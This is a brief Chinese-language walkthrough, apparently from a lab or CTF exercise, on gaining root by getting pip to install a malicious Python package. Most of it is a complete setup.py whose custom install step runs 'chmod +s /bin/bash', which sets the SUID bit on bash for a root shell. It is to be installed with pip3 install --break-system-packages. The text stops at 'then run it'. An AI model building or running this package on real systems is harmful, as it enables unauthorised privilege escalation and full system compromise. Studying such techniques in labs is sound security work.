pip提权漏洞可以通过创建一个恶意的Python包并让pip安装它来获得root shell

直接写一个恶意的python包，并且使用/usr/bin/pip3 install --break-system-packages *来执行恶意的python包

方法一—-对/bin/bash写入suid权限

helpdesk@helpdesk:/tmp/exploit$ vi 1.py
helpdesk@helpdesk:/tmp$ cat 1.py
from setuptools import setup
from setuptools.command.install import install
import os

class MaliciousInstall(install):
    def run(self):
        install.run(self)

        os.system('chmod +s /bin/bash')
       

setup(
    name="malicious-package",
    version="0.0.1",
    description="A malicious package for privilege escalation",
    author="Hacker",
    author_email="hacker@example.com",
    cmdclass={'install': MaliciousInstall},
)

然后运行一下
